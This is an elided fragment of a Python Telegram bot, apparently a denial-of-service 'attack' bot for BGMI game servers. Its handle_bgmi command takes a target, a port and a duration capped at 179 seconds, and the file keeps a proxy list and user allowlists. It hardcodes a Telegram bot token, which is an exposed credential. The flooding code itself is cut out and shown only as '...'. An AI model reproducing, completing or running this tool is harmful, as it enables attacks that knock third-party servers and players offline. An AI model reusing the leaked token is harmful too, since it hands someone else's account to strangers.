...
# @ZEXONOP009 GRPTg #from keep_alive import keep_alive
# @ZEXONOP009 GRP #keep_alive()
# @ZEXONOP009 GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('7921815407:AAHtUg5N9R7ERUUnPiJHFfjvv8TJnDZHJeE')
...
# @ZEXONOP009 GRP # List of proxy addresses
PROXIES = [
...
def log_command(user_id, target, port, time):
    ...
    if user_info.username:
        username = "@HACK_CHIYE" + user_info.username
    else:
...
def handle_bgmi(message):
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # @Fire_Sanu GRP # Updated to accept target, time, and port
            ...
            if time > 179:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 179 𝘀𝗲𝗰"
            else:
